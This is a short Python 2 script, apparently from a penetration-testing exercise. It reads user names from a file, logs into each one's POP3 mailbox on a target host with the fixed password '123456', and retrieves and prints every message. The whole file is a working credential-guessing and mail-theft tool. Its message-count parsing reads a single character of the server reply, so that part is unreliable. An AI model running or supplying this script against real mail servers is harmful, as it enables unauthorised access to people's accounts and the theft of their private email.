#!/usr/bin/python

import socket
import time
import sys

if len(sys.argv) != 2:

	print "Usage: vrfy.py <ip>"

	sys.exit(0)
else:
	host = sys.argv[1]

def check_mail(host, user):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((host,110))
	banner = s.recv(2048)

	s.send('user ' + user + '\r\n')
	result = s.recv(2048)

	s.send('pass 123456\r\n')
	result = s.recv(2048)

	s.send('list\r\n')
	result = s.recv(2048)

	print result

	for i in range(int(result[4])):
		print "Mail: " + str(i+1)

		s.send('retr ' + str(i+1) + '\r\n')
		time.sleep(1)

		mail = s.recv(2048)
		print mail

	s.close()

with open('users.txt', 'r') as reader:
	user = reader.readline().replace('\n','')

	while user != '':
		print("MailBox: "+ user)
		check_mail(host, user)

		user = reader.readline().replace('\n','')